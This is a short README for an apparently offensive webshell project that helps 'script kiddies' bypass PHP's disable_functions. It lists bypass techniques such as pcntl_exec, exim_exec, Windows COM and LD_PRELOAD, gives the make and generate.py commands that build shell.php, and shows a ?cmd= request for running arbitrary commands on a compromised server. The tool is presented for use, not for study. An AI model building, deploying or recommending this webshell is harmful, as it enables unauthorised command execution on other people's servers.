# A webshell help script kiddies to bypass disable_functions

## methods

* unfiltered functions directly execute
* php5 pcntl_exec
* exim_exec
* windows php5.x COM
* LD_PRELOAD bypass

## Usage

in order to use `ld_preload` to bypass, we need to copy the shared object file's content, you can execute following command to make things easy:
```shell
make
python generate.py gotit_x86.so gotit_x64.so
```

then you got the file `shell.php`

and requests:

```
http://xxxxxx/shell.php?cmd=<do what the fuck you want to here>
```

## Others

just a demo and ugly code written when i had headache